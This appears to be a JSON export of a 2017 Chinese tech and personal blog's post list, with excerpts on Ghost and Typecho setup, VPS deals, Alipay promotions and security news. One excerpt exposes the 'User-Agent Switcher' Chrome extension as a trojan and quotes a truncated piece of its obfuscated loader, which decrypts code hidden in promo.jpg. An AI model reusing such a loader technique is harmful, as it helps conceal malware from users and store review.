VPS、服务器等信息还是有一点点参考比较价值用途的。\n相比之前的脚本，这次提供的最大区别就是检测节点都是国内的，比较适合国内的朋友使用。本次测试的","link":"/it/386.html","date":"2017-10-06T09:48:18"},{"title":"『推荐』支付宝新的推广活动，人人都能赚赏金！","content":"支付宝和微信为了实现无现金城市，扩张自己市场占有率，可算是下了血本了。不过目前来说支付宝的干货还是比较多的，微信相对而言略少一点儿。但是微信的日活数比起支付宝明显要多很多。支付宝在不断的努力中…..今天再为大家介绍一个支付宝的推广活动！！请仔细阅读以下内容吧！！！\n\n领取地址\n扫码领取奖励金！！！！ 金额最高99 元！！！！ 每天可扫一次！！！！\n\n\n\n更新：\n2017年12月12日19:03:28 更新：支付宝从12月1日开始变更了活动规则了，里面有重点内容，已经高亮！\n\n2017年12月10日17:52:22 更新：疯狂的一天。今天扫码红包金额都很大！有人互刷红包有风险！可能造成无法领取高额红包。\n2017年12月7日11:48:02 更新：谢谢评论区网友提醒，之前的红包二维码竟然失效了！你以为只是更新了个二维码么？\n2017年11月1日10:00:35 更新：最近支付宝用户可以免费领取赏金海报。\n2017年10月13日15:02:44 更新：根据支付宝最新的消息，10月13日开始推广获取的钱直接进支付宝余额，不再是红包了。\n\n推荐赚赏金\n支付宝最新的推广活动！！ 人人都可参与哦~","link":"/my/385.html","date":"2017-10-05T03:24:00"},{"title":"2017年的国庆第一天","content":"由于前段时间自身的原因，错过了安排，以至于今年的国庆只能在“加里敦”，像以往休息日一样，国庆第一天本想先睡个懒觉的，结果8点不到就没俊哥电话吵醒了（真想冲过去揍一顿233），接着就开始“白日失眠”了，怎么翻覆都不能入睡，索性起床洗漱、烧早饭、吃早饭、洗碗（似乎最近在家静养都是这么一个节奏……）。\n接着就是照例与习大大电视“沟通”，另一边翻翻录手机微信、支付宝收集能量等等，开始一个无聊的一天。实在闲着坐不住，还是起床打扫一下卫生吧，怎么说今天也是祖国妈妈生日，咱也不能太邋遢了，好好清扫一番，结果扫出了一部手机——当年的机皇：诺基亚N73，这手机算是早些年二手淘来的，要知道当年N73流行的时候，咱也只能远远的遥望，就如现在看iPhone X一般心情，总想着哪天能入手一部把玩一番（结果嘛，就有了这台N73）。由于多年未开机，电池里的电早已Over，为了见证是否还会有奇迹，又翻了好一会，找到了一个输出小圆孔的诺基亚原装充电器，赶紧接上手机，刚开始还没反应，充了一会再打开时，一会就出现了那经典的握手开机画面（心里美美的，古董又要焕发“青春”了）。不知道是不是长时间没充电了，充电到完成花了一个小时","link":"/my/384.html","date":"2017-10-02T13:25:03"},{"title":"重启Ghost 0.7.4中文版","content":"本人入道Ghost比较晚，当时用的就是王赛童鞋的Ghost0.7.4中文版，特别喜欢那默认主题，也认真用过一段时间，后来由于折腾的原因又转回Typecho了。要不是这次博客更换域名，估计也不会再用Ghost博客程序了，出于那时的体验，加上对Ghost1.X版本的憧憬，这次回归时并没有使用0.7.4中文版，而是直接按照Ghost官网教程搭建了新版的Ghost博客。\n新版的Ghost博客主题样式有了很大的改变（貌似完全两样233），由于目前王童鞋这边还没出Ghost1.X版本的中文版，所以用英文版的博客程序，使用当然是不会有影响的，就是文章显示等感觉有点……，毕竟英文版的东西要显示中文，总感觉少了那点样式。经过一段时间的使用及考虑，还是想回归0.7.4中文版（目前王童鞋出的最高中文版本了），反正那些功能也够用了，等以后王童鞋出了新版的中文版（汉化）了，再换嘛。\n博客依旧可以通过实验室功能进行导出或导入，但是Ghost1.X版本导出的内容，在0.7.4版本上导入会出现导入失败提示（好大之前的备份还在），当然0.7.4版本导出的在Ghost1.X版本上导入是不成问题（就是没有摘要），评论系统就","link":"/it/383.html","date":"2017-10-02T13:24:34"},{"title":"懵逼！Chrome 的插件 User-Agent Switcher 是个木马","content":"\nChrome 商店搜索 User-Agent Switcher,排第一的这个插件(45 万用户),是一个木马...官方地址无法访问？这里有一个压缩包：链接: https://pan.baidu.com/s/1nvBRemH 密码: 4inq\n\n为了绕过 chrome 的审核策略,他把恶意代码隐藏在了 promo.jpg 里， background.js 的第 80 行,从这个图片里解密出恶意代码并执行\nt.prototype.Vh = function(t, e) {\nif (&quot;&quot; === '../promo.jpg') return &quot;&quot;;\nvoid 0 === t &amp;&amp; (t = '../promo.jpg'), t.length &amp;&amp; (t = r.Wk(t)), e = e || {};\nvar n = this.ET,\ni = e.mp || n.mp,\no = e.Tv || n.Tv,\nh = e.At || n.At,\na = r.Yb(Math.pow(2, i)),\nf = (e.WC || ","link":"/my/382.html","date":"2017-09-29T07:25:42"},{"title":"Vultr已正式支持支付宝咯","content":"相信很多在用Vultr家VPS的站长们，都知道早在月初官方就有意支持支付宝了，只不过那时想用需要发工单才可以（苦逼……），估计官方也意识到了我们国人的重要性，加上老马家的支付宝的名声……（这纯粹属于个人揣测哈），不管怎么说，现在不用再提交工单了，可以在后台直接使用了。\n\n这里需要注意的是，目前支付宝只支持10美元以上的充值，低于10美元，会报错哦：\nInvalid amount - minimum deposit is $10.00\n这里以10美元为例，当你点击提交后会跳到支付宝支付扫码界面：\n\n看到了吧，10刀=人民币66.26元，比当前的汇率65.56稍贵一点，这点俺就不作说明了，都懂吧233目前，Vultr有支持15个数据中心，虽然有日本亚洲机房，但是线路上并不是很好，如果是用来建站用途的，建议选择西雅图或者是洛杉矶。而且月费2.5美元方案的并不是大部分机房有货，俺大概看了一下，纽约和迈阿密是有货的，其他好像都没有。之前可以投机申请的，现在也失效，所以如果手上还有2.5刀机房的，删除等要注意哦，删除了就没了233最后说一句，也是最重要的，要买Vultr请点击优惠链接\n","link":"/my/381.html","date":"2017-09-29T07:24:48"},{"title":"Ghost1.X博客使用记一","content":"之前用过中文版（应该叫汉化版）0.74，挺好的，很多功能都给你内置好了，比如图片存储直接可以通过修改Ghost目录下的config.js中的代码实现，就像我用七牛，只要把七牛的密钥、空间名等输入即可，可到了Ghost1.X之后，没要稍微复杂点了，加上目前还没出现汉化版（要幸苦王赛童鞋了，抓紧搞……），只能通过类似于插件的办法安装。Ghost1.X跟以往的版本一样，依旧没有评论系统，这点可真没办法跟Wordpress或Typecho等相比，可就是这样还是有很多人‘摩拜’它，还有很多很多可能都没法相比，但我还是选择了你—— Ghost。\n\n使用七牛等作为默认存储官网有说明，还列举了很多第三方存储、如亚马逊、又拍云、七牛、阿里云OSS等等，这里以七牛为例说明：\n\n安装方法有两种，分别为NPM和Git，具体如下：\n\nNPM方法安装创建目录：\n\nmkdir content/adapters/storage\ncd [Ghost博客目录]/content/adapters/storage\n安装Qiniu存储模块\nnpm install ghost-qn-store\n将模块复制到正确的位置\ncp -v","link":"/it/380.html","date":"2017-09-29T07:24:05"},{"title":"Debian 8.X搭建Lnmp+ Ghost 1.x 教程","content":"其实类似的教程挺多的，尤其是Ghost 1.X版本之前的，真的不要太多，写这个教程也只是自己参照官网教程和烧饼博客之后，对自己的搭建经历作一个小小的回顾。因为本人还要折腾点别的小玩意，所以不仅要将Ghost博客搭建起来，还要将PHP环境等也一同搭建，便于日后的各种折腾。好了，废话不多说，开始啰嗦之旅吧。\n\n首先搭建Lnmp，可用的环境包有很多，比如军哥的Lnmp，还有最近比较火的OneinStack等等，个人比较喜欢OneinStack，觉得功能上比前者要丰富。具体的搭建步骤，请参考官网，一路配置下来估计也要半个小时左右，成功率100%（反正我折腾了这么多次，从来没有失败过），搭建好之后，建议先做个快照！2017-8-19补充：还是把Oneinstack的搭建步骤照抄一下吧，给看的亲们省点时间233\n\nyum -y install wget screen curl python #for CentOS/Redhat\napt-get -y install wget screen curl python #for Debian/Ubuntu\nwget http://aliyun-oss.l","link":"/it/379.html","date":"2017-09-29T07:22:00"},{"title":"信用卡&amp;amp;quot;黑话&amp;amp;quot;","content":"                       “天王盖地虎！”\n                                   “宝塔镇河妖！”\n黑话：一种特殊的语言讯号，江湖中人彼此联系的一种特殊手段。在信用卡圈子，也有自己的专有黑话，比如，薅羊毛、火鸡……，有些我也是刚听说过，捞过来瞧瞧吧\n信用卡黑话\n【砖】：在银行里，一般是一万块钱绑成一捆，一捆一捆的钱形似砖头，型如红砖，所以把一万块钱叫做1砖。\n【大砖头】：十万块钱，去银行柜台存取大额现金的都见过银行都是 100 张粉红毛爷爷用纸条捆好，十捆由专用的机器用塑料封条固封，所以 1w 是一砖头，10w 是一个大砖头。\n\n【搬砖】：一般指拿着现金到银行存钱，特指存钱到银行以办理贵宾借记卡或者申请信用卡的行为。\n【地摊】：指在商场、企业或者小区门口等人流量比较大的公共场所摆设的办理信用卡的银行摊位。\n【羊毛】：积分或利润，对从银行获得的好处的统称。\n【薅(hāo)羊毛】：从银行得到收益的行为，搜集各种优惠信息，花更少的钱办更多的事，常常这么做的人被称为羊毛党。（参见当年春晚上赵本山宋丹丹崔永元的小品『昨天今天明天』）\n【腿毛】：","link":"/my/377.html","date":"2017-07-29T12:53:00"},{"title":"Ghost实现归档、标签云、搜索","content":"前面说过，Ghost本身并不自带类似文章归档、标签云，搜索等（后台不知道会不会改进），虽然官方没有给出，但这也不能阻止民间高手们，通过API就能实现上述这些功能。\n归档\n\n首先得在后台的 实验功能 中启用 API ，如图:\n新建自定义页面：\n\n1.创建一个静态页面：在ghost后台新建页面，发布为 独立页面 ，标题为Archives，网址可以设置为 域名/archives-post \n2.接着创建一个自定义页面模板：该模板是第一步创建的静态页面的模板，创建一个page-url.hbs模板，如果第一步设置的页面网址为 域名/archives-post ，那么模板即为 page-archives-post.hbs 。将该模板上传至主题根目录下即可，此时访问域名/archives-post，即会调用自定义的page-archives-post.hbs这个模板。\n\n在page-archives.hbs中调用Ghost API即可：\n\n{{!&lt; default}}\n/**\n\n调用ghost API，完成文章归档功能\n所需组件：jQuery、moment.js\n@ldsun.com\n*/\nj","link":"/my/376.html","date":"2017-07-26T12:52:00"},{"title":"似乎又开始折腾了","content":"本来消停了一段时间（有点打脸的感觉），用着Typecho写写小博客还挺happy的，本以为就这么“安定”下去了，哪知搬回到阿里云后，事就多了，先是文章、后台打不开（首页可以打开），后来修改 php.ini ，将 cgi.fix_pathinfo 的值由0改为1解决了，本以为这么结束了就OK了，谁想过了几天，突然发现评论不会回复邮件了，原先在华为云时都调试好的，咋的就……\n于是乎把插件、PHP环境、系统等都调试、更换过，NN的还是不行，碍于技术有限，加上又想折腾Ghost了，所以干脆扔掉直接装Ghost做博客程序了。常来逛的朋友估计知道，本博中间也有换过Ghost，对自带主题等也有做过一些魔改，当然也有备份过，所以重新上手时也挺快的，按照这个教程：在CentOS7.2上安装Ghost,SSL证书用的是AlphaSSL的泛域名证书，评论用的是Disqus（用过畅言等，都感觉不爽），目前已折腾的基本完善了。一路折腾过来，主要问题还是在归档、标签、搜索上，Ghost不像Typecho、Wordpress等，它呀的好多本身都没有，好在0.74中文版可以在后台的 实验功能 里，将 开放API 打勾","link":"/my/375.html","date":"2017-07-26T12:51:00"},{"title":"使用disqus-php-api搭建评论系统","content":"众所周知的原因，国内已经访问不了Disqus评论了，暂时也无解，除非哪天GFW解除了这个限制（估计这个可能性……？），加上现在使用Ghost博客，其自身也没有带评论系统，以前还有多说可以使用，倒是用的挺好的，后来多说关闭之后，其它的诸如：畅言、友言、网易云跟贴（这个8月1日也要关闭了）等，感觉体验都不太好，或是太臃肿、或是有广告，反正用了几天就不想再用了。无奈之下，只好使用Disqus——这个老牌评论系统了。\nDisqus至少目前来看不会那么快翻船（这点真佩服老外），但是碍于现状，只能翻墙使用（经常爬梯子也累呀），后来听说有大神出了神器 disqus-php-api ，按他的理念是（原文摘抄）：\n\n我想起了一种方法，想要实现不翻墙即可访问 Disqus API，可以找一个服务器，客户端数据把发送到这个服务器，它接过手后顺便使用 cURL 发给 Disqus，根据 Disqus 返回的内容，服务器可直接返回给客户端，也可以将其简单处理一下再返回，感觉这也是反向代理。\n\n\n既然有神器了，那就赶紧用吧，具体步骤如下：\n\n首先翻墙上Disqus官网申请，申请好之后在设置中输入用户名并记牢，然后","link":"/it/374.html","date":"2017-07-18T12:49:00"},{"title":"Typecho搬家后文章、后台无法打开的解决方案","content":"说来都觉得自己有那么点无聊，当初从阿里云转到华为云，然后现在又转回去——折腾啊！搬回到阿里云，顺手把OSS也挂载了当硬盘使，这样下次再折腾就不用老是先备份下载了。老样子还是使用Oneinstack家的一键包搭建的LNMP环境（本来还想再折腾一下Ghost的，不过想想还是算了），配置好站点，然后接着导入数据库，再把博客相关文件上传到配好的目录，本以为大功造成时，结果……\n不管是访问后台，还是文章，都报 Access denied ，好郁闷呀！找了度娘，没看到什么好的答案，结果在Segmentfault上找到了方法，那就是修改 php.ini ，将 cgi.fix_pathinfo 的值由 0 改为 1 ，怎么找这个文件？可以在 phpinfo.php 里看到具体的路径。修改好之后，重启PHP和nginx即可或者也可以直接重启服务器。\n问题解决，可以正常使用了\n","link":"/it/373.html","date":"2017-07-11T08:13:45"},{"title":"Typecho后台增加极验证","content":"得空逛了一下Typecho社区，看见有后台登录验证插件，那就赶紧给自己的后台武装一下吧，省的一天到晚的裸奔（多少总会提升一点安全性吧@(你懂的)）。注册的步骤咱就不说了（不知道网址？百度搜索 极验证 ），插件之前用的是摸鱼的（下载地址：https://www.moyu.win/archives/28.html），可是我从头到尾试了好几遍也没成功过，老是显示启用中，考虑到他也是修改前者的，那我就去找前者看看吧。\n\n先下载插件（链接: http://pan.baidu.com/s/1pLx52tX 密码: i7u5），我修改了Plugin.php，把其中一个JS文件的路径由http改为https（不改过的话，像我这种使用https 的站点会提示安全风险）\n开始魔改代码了\n\n\n增加/admin/geetest-code.php文件，用来返回极验服务响应数据：\n\n\n        Typecho\n","link":"/it/372.html","date":"2017-06-27T11:22:06"},{"title":"Alpha SSL泛域名证书折腾记","content":"主机一直用的是Oneinstack的环境包，原来想弄个SSL证书都是到处申请，后来Oneinstack升级之后，支持一键获取Let's Encryot 证书后，就一直用这个了，这不最近又想折腾点子网站，想弄SSL的，一看又得去找证书，虽然一键包支持，但好像有数量似的，弄多了就会出现不成功现象（可能是我手气不好吧），干脆去搞个泛域名证书，以后搞子网站也就不用麻烦了。\n\n\n首先去 https://csr.chinassl.net/generator-csr.html申请 CSR 文件。注意：CSR 申请那里的域名一定要填*.uefeng.com 这样的格式，要不然申请到的是单域名的。\n然后去 https://assl.loovit.net/ 输入之前申请的 CSR 文件内容和邮箱，进入下一步会让你选择哪个管理员邮箱来接收验证邮件，点击验证连接后就能看到你的 CA 证书内容了。\n一切弄好之后上传服务器，并重启Nginx，小绿锁就这么轻松易主了，还是泛的哦\n\n本以为到此就OK了，可当我拿出手机想访问看时，竟然提示证书风险@(狂汗)，回想前些天在有意上看过类似的文章，赶紧去打开，原来出现这种问题","link":"/it/371.html","date":"2017-06-14T04:48:00"},{"title":"又是一个总值的早晨","content":"每次总值（值班）都睡不好，虽然运气都还比较好吧，几乎都没有半夜被电话吵醒过@(捂嘴笑)但是却也不能像在家里那样好好的睡，总是担心在某个时刻那该死的手机会响起，好不容易熬到早晟时，却又得被楼道里的阿姨们干活、说笑声给吵醒（唉……）\n\n因为单位的关系，反正每个月总要被排上个两至三次，虽然不幸点，但事后还能补休半天、拿50元RMB@(太开心)，所以但凡幸运点（一夜到早上没有电话），还是划算的，个人自我安慰吧@(你懂的)，反之那就要恭喜喽………………总值的另外一个“好处”，就是可以让我起的早一点，要知道在家里可起不来那么早，这就印证了凡事都可以分两面来理解，说它是坏的吧，可能还有好的一面，只是有没有被人发现而已。就如同快乐也是要付出代价般，凡事都顺顺利利的，那只能说明狗屎运太好了@(酷)今天还是高考的第一天，在此祝愿940万的考生都能取得理想的成绩@(玫瑰)\n","link":"/my/370.html","date":"2017-06-07T22:48:00"},{"title":"勒索病毒（Wannacry蠕虫病毒）预防方案","content":"事件背景\n5月12日晚， WannaCry 蠕虫病毒在全球大肆爆发。据BBC、CNN等媒体报道，恶意攻击者利用 NSA（美国国家安全局）泄露的 Windows 0day 利用工具对99个国家实施了超过75000次攻击，主要影响SMB和RDP服务，主要影响了137、138、139、445端口。目前已知已知的Windows版本包括但不限于一下都受影响：\n\nWindows NT\nWindows 2000\nWindows XP\nWindows 2003\nWindows Vista\nWindows 7\nWindows 8\nWindows 10\nWindows 2008\nWindows 2008 R2\nWindows Server 2012 SP0\n\n2017-5-16补充：\n勒索病毒各系统的SMB补丁下载地址：链接: http://pan.baidu.com/s/1c1Tx6zY 密码: 3jvg\n勒索者源头来自暗网，攻击具备兼容性、多语言支持，多个行业受到影响，国内高校网络系统沦为感染重灾区。据有关机构统计，目前国内每天有数万台机器遭到该蠕虫病毒袭击，国内的ATM机、火车站、自助终端、邮政、医","link":"/it/369.html","date":"2017-05-15T07:50:00"},{"title":"小心你的电脑被勒索了","content":"最近懒癌发作，以至于对这么严重的电脑病毒——勒索者病毒，竟然都不知道！（太不应该了，那咋办，懒癌严重呀），这不今天收到华为发来的邮件才晓得，要不然哪天自家电脑被勒索了都不故道是咋回事，来秀个邮件原文吧：\n\n【严重】警惕勒索者病毒安全预警\n一、概述\n近日英国、意大利、俄罗斯等全球多个国家爆发勒索病毒攻击，中国大批高校也出现感染情况，众多师生的电脑文件被病毒加密，只有支付赎金才能恢复。经初步分析，该病毒加密数据或获取密钥后，会自我删除病毒程序，因此事后通过杀毒软件无法发现异常。加密数据后，会在桌面和多个目录生产一个类似!README.HTML的文件，告知管理员数据被加密和解密的途径。\n二、预警级别\n级别：严重。（说明：级别共四级：一般、重要、严重、紧急。）\n三、影响范围\n若被植入该木马，主机的所有数据都会被加密，且无法自行修复。\n四、验证方法\n若中勒索者病毒，主机业务无法使用，会在桌面和多个目录生产勒索文件。\n五、安全建议\n目前勒索者病毒无法自行修复，最好方法是提前预防数据丢失，建议做好如下几点：\n\n数据异地备份。不要备份到本机，勒索者病毒同样会导致备份数据被加密。\nWindows系统确保","link":"/it/368.html","date":"2017-05-14T06:33:00"},{"title":"狗东又牛了一回","content":"今天下午接到狗东的电话，说我2015年买的松下固态硬盘因代理商涉假，再召回并假一赔三，刚开始还没回过神来（最近没怎么去关注这类事），后来客服又详细解释了一遍，于是愉快的答应了。其实这个松下固态硬盘，我还一直觉得挺不错的（难道我这个是真的？），还记得当时一收到就装好系统驱动跑分了，结果也很OK，用了快两年了也没出过任何问题，可惜我还是选择了……\n上网搜了一下，附个原文：\n\n近日，京东官方发布公告表示联手上海警方破获一起供应商涉嫌向京东掺售仿冒品的案件，并宣布全面召回所有问题产品，并向消费者进行退一赔三的先行赔付。京东联手警方打假并全面召回问题产品，先行退一赔三。京东方面表示，之前在京东商城所售(目前已下架)的三款Panasonic固态硬盘产品(V3M、X3M、XTM)被品牌商否认为正品。而这些产品曾在2015年起就广泛流通于各大电商平台和线下市场。经过调查，京东发现这些产品均来自于上海通微电子科技有限公司，其也是松下机电固态硬盘产品在中国大陆地区的唯一授权经销商，拥有松下机电完成的授权证明。一方面，该涉事企业是松下机电的唯一授权经销商，一方面松下机电却又否认其所销售的产品为正品，个中蹊跷","link":"/my/367.html","date":"2017-04-28T02:34:00"},{"title":"让TYPECHO评论头像旋转方法等","content":"查找当前主题下的style.css。CSS文件根据主题自行选择可能名称不符。找到以下代码：\n#comments .comment-author .avatar{display:block;float:left;width:40px;height:40px;margin:1.4rem 1rem 0 0;border-radius:50%}\n修改为：\n#comments .comment-author .avatar{display:block;float:left;width:40px;height:40px;margin:1.4rem 1rem 0 0;border-radius:50%;transition: all 0.5s}\n&lt;h1&gt;comments .comment-author .avatar:hover{transform:rotate(360deg)}&lt;/h1&gt;\n即可大功告成@(太开心)\n具体演示效果，可参照本博客评论头像，如果你跟我一样使用Hran的主题，可以直接查找替换。\n transition: all 0.5s 是表示旋转在0.5秒内完成，","link":"/it/365.html","date":"2017-04-08T15:04:00"},{"title":"华为云改密钥为密码方式登陆","content":"细心的童鞋们估计发现了本站一个问题，那就是从昨晚到今天傍晚都无法访问，千万别以为是被攻击了，其实是本人那折腾心又燃起来了—想换个Ghost博客程序玩玩（什么？没人发现，好吧，观众不够多…………），陆陆续续弄了一天了，我的Ghost还是不想跟我见面，不是这个缺就 那个装不了报错等，我的M呀，碍于华为云的糟糟（没地吐槽呀），到目前为上还不支持包年用户换系统（第一次选的是什么，后面就只能重装，，，重装……），所以只能郁闷了……\n其实想吐槽华为云的缺处还有很多，比如重装系统后要强制开启密钥方式登陆（问了客服，好像现在可以选择了，但是之前“被强迫”使用密钥的客户改不回去，官方说法是提高系统安全性，那用户那点权利上哪去了？看客们也别说我怎么会这么sha，会买它，能说我被忽悠嘛……扯远了），如果不喜欢密钥方式登录的，可以通过后台 远程登录 ，修改 sshd_config 来解决，具体的为：\n\n打开远程登录后，使用屏幕上提示的用户名和密码登录，一般用户名为 linux ，密码看账号后面的\n输入sudo vi /etc/ssh/sshd_config ，然后按 a 键或者 Insert 键，找到内容为P","link":"/it/364.html","date":"2017-04-08T11:05:00"},{"title":"衢州市公积金办理个人缴款过程记录","content":"不管怎么说，始终都逃不脱成为“伟大”房奴的命运，而为了让这房奴稍微压力轻一点，莫过于公积金了，虽然做不了公务员那般洒脱，但我们也至少能来一个混合贷，在这种事上哪怕能省一点也是好的，有M的GG和MM可以飘过……。在去办理之前，也听了一些朋友的讲说，对流程大致有了一定的了解。大致就梳理一下吧：\n\n\n准备好身份证原件及复印件，户口本原件及本人户口页复印件（我是全复印了，但最后只收了我自己信息那页）\n去西区中国人民银行拉个人征信报告（可以不用上二楼，直接在一楼保安接待边上的机器上拉取，只需身份证原件加拍照（机器会给你拍的），输入手机号码就可以摘取自己的征信报告了\n去西区行政服务中心一楼拉取社保交纳清单，机器上可以拉，就在大厅进来一点点地方，拉好就上二楼（千万别被办不动产的亲们吓到，不是一般的多），走楼梯上的话直接往左边拐进去，里面还有一个大厅，可以不用取号，直接往里面走找公积金咨询台，说明来意后，工作人员会给一份介绍信（好像是这个名）和授权书（可能会给你好几份，不要紧先拿着就是了，实际到最后只需要一份给公积金办就可以了）。目前我市公积金推荐银行是建设银行，邮储也可以（但是手续会比建行稍麻烦点）","link":"/my/363.html","date":"2017-04-06T13:35:00"},{"title":"Typecho修改后台路径留下的漏洞","content":"在溜网络发现了一篇关于Typecho的重大消息——大漏洞，赶紧照着检测了一下，虽然目前没问题跳空白或404了，但看到不少网友在评论说出现了博主说的问题，那还是等重视一下，赶紧收录吧：使用Typecho几年了，之前也是看到网上一些教程，说是修改后台路径可以增加一定的安全系数，从理论上来说是对的，我也使用修改后的后台路径好多年。通过修改配置文件 config.inc.php 的后台目录:\n/* 后台路径(相对路径) /\ndefine('TYPECHO_ADMIN_DIR', '/admin/');\n将admin修改为其他目录，然后通过FTP将admin目录做相应的名称修改，这就完事。\n如果以为这真的完事那就真的是太相信Typecho了。刚才在某群里说到wp为何不修改后台地址进行提升安全系数，有人说没多大用处。我在想，这没理由啊，我自己修改后台路径这么多年，都没见什么破解，原来是我图样图森破。通过浏览器在后台登录界面那里打开个F12，可以看到首先是提交到一个action/login，然后302重定向到正确的登录界面。\n而这个地址是暴露到大众面前，完整地址是：http://domain.com","link":"/it/362.html","date":"2017-03-26T16:20:00"},{"title":"关于主题盗版的个人看法","content":"本文以下内容非我所写，转载谨以一个购买者身份声援Hran（也就是我我使用的主题：Mirages），Hran给模板定义的价格只有50元，这在付费模板里已经算是很低了，如果你跟我一样喜欢他的模品，为何不能通过正常途径去购买下载并使用呢？不论什么模板，作者都是花了大量时间去做的，请尊重他人的劳动和成果！只有一个良性的循环，才能保证模板今后的售后等运转，国人确实有必要树立好版权意识！\n原文如下：\n发生了什么？\n今天早上刚吃完早饭，就从 吃瓜Hran 的主题售后群里看到这样一张图片：\nMigrates主题是一个非常好看的单栏Typecho主题，我几个月之前第一眼看到了就喜欢上了这个主题，花了钱购买了下，以给作者支持。详情：https://hran.me/archives/mirages-1.html\n今天看到这张图，以为是Hran把主题设置成了免费，准备分享出来。但是，紧接着，发现事情不对，Hran发了一张哭的表情。我明白了：主题被别的人恶意分享出来了。而且没有经过作者同意。随后，经过群内小伙伴的帮助，联系到了TE论坛的管理，删除了这个帖子。\n个人看法\n事情的经过大致就是这样。可怜了我吃瓜的Hr","link":"/my/361.html","date":"2017-03-26T08:29:00"},{"title":"华为云：学生机 9 元 6 个月","content":"\n先前刚吐槽过华为云的免费试用活动不给力，他就推出了学生机，好超值！对于在校生来说这会还是蛮有诚意的！\n\n详情请点击：高校精英计划\n配置图\n\n活动说明\n\n活动时间：2017年3月3日-2017年6月30日；\n活动适用人群：活动期间新注册华为企业云账户的高校在校生（博士、研究生、本科、专科）；\n活动参与流程：注册/登录华为企业云账户—账户充值1元 —免费领取软件开发云奖励金券—选择A/B任一套餐下单并开通云主机；\n软件开发云2000元奖励金券：领取后60天内有效，适用于软件开发云产品，使用后不予退还；\n每个用户每人最多限领1台云主机套餐和1张软件开发云奖励金券，领取代金券后充值金额不支持退款，套餐开通后不予以退换，请按需选择；\n云主机免费套餐结束后如需继续使用，按官网原价续费；\n为保证活动的公平公正，华为企业云有权对恶意刷抢（如通过程序等技术手段）活动资源，长期资源闲置，利用资源从事违法违规行为，发现倒卖相关优惠资源、帐号等行为，将没收其优惠资源。\n\n注意点\n因为现在华为云更改了安全机制，所以新建系统默认使用密钥方式登录，如果有用不习惯的，可以在后台通过远程方式修改，这里以Debian8","link":"/my/360.html","date":"2017-03-23T14:21:00"},{"title":"多说评论导出到Typecho","content":"相信大家都看到多说的公告了，震惊呀！真有点不敢相信会来的这么快（虽然也知道早晚的事，没有一个稳定的经济来源，哪里支撑的了呀，这么多的骚年们的折腾呀），就如评论里说的，很多人才刚折腾好，结果就……一切都来的太快，但既然来了，还是得去应对的，试了试其它的评论系统，如畅言、云跟贴、友言等，发现都没有多说那么让人折腾，看来只能想办法把多说的评论本地化了！\n在网上百度了好久也没找到一个好的解决办法，最后还是在QQ爹那里得到帮助，使用插件（这个插件还是最近刚更新的，有意的……哈哈），现在就来Look一下吧：\n插件的介绍及更新历史\n\n[2017-03-23]导入评论时会对 emoji 表情做过滤，防止 MySQL 出错。\
